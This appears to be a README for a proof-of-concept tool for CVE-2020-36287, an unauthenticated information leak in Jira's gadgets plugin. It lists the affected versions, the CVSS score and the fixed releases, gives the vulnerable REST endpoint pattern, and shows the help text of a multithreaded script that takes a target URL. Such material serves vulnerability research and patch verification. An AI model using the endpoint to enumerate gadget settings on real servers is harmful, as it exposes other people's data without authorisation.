# CVE-2020-36287
The dashboard gadgets preference resource of the Atlassian gadgets plugin used in Jira Server and Jira Data Center before version 8.13.5, and from version 8.14.0 before version 8.15.1 allows remote anonymous attackers to obtain gadget related settings via a missing permissions check. 

```
Affected software: Atlassian Jira Data Center, Jira Server (also tested on Jira Project Management Software)
Affected Vesrion: Before version 8.13.5, and from version 8.14.0 before version 8.15.1
CVEID: CVE-2020-36287
CVSS Score: 5.3 (Medium)
CVSS Score: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Fully Patched Version: 8.13.5, 8.15.1, 8.16.0 

Link: https://site.com/secure/Dashboard.jspa
POC: https://site.com/rest/dashboards/1.0/10000/gadget/{ID}/prefs


usage: CVE-2020-36287.py [-h] [-t THREADS] [-o TIMEOUT] -u URL

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS, --threads THREADS
                        number of threads (15)
  -o TIMEOUT, --timeout TIMEOUT
                        timeout
  -u URL, --url URL     url
```
